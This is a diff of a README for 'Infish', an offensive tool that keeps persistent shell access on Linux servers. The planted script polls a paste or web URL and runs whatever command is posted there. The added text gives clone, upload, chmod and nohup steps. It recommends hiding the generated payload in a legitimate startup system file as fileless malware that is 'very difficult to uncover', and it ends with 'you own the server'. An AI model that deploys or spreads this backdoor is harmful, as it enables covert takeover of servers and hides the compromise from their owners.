@@ -1,6 +1,6 @@
 # Infish
 
-Infish stands for infinite shell. It's a way to maintain persistent shell access (command and control) on a linux server even without ftp, ssh, or cpanel access. It works on all linux servers, even on shared hosting.
+Infish stands for infinite shell. It's a way to maintain persistent shell access (command and control) on a linux server even without ftp, ssh, or cpanel access. It works on all linux servers, even on shared hosting. It's a demonstration of a fileless maleware.
 
 Note that this project is for **educational purposes** only. I bear no responsibility for how you use it. For this reason, no specific tutorial will be given for how exactly when or where to use this tool.
 
@@ -13,6 +13,17 @@ Anytime you need to run a command, simply edit the paste to the command you want
 
 # Usage
 
+First clone the git repo
+
+```bash
+$ git clone https://github.com/phrenotype/infish.git
+```
+
+Then move into the directory
+
+```bash
+$ cd infish
+```
 
 As usual, to see usage,
 
@@ -37,7 +48,7 @@ $ chmod +x infish
 
 ## Using a raw url
 
-This is when you already have a webpage (observe opsec) or have already created a paste by hand. Get the **raw paste url** or the url or the page and run the following command
+This is when you already have a webpage (observe opsec) or have already created a paste by hand. Get the **raw paste url** or the url of the page you choose and run the following command
 
 ```bash
 $ ./infish --url 'https://example.com/cmd' --sleep 900 --user-agent 'Mozilla 5.0'
@@ -115,7 +126,13 @@ eval "$decrypted";
 ```
 **You can specify the output filename or path using the `-o` or `--output` option**.
 
-Finally, upload the **.infish** file to the target server and then, make it executable by running   
+
+## Deployment
+
+There are two ways. Deploying it as a file on it's own, or as a **fileless** malware. I recommend the later.
+
+### As A StandAlone File
+Upload the **.infish** file to the target server and then, make it executable by running   
 
 ```bash
 $ chmod +x .infish
@@ -126,7 +143,13 @@ Then to begin c&c, run
 ```bash
 $ nohup ./.infish & disown
 ```
+If you have root access, you can set the last command above to run on boot. I will let you figure this part out.
 
 Now, you can edit your paste to any shell command and the server will run it.
 
-That's it, you own the server. If you have root access, you can set the last command above to run on boot or attach it to a legitimate file that runs on boot. Figure that part out.
+### As A Filess Malware
+
+This is more devastating and very difficult to uncover. It involves adding the generated malware code to a legitimate system file that runs on startup. Again, figure that part out.
+
+# Finally
+That's it, you own the server. At least for now...
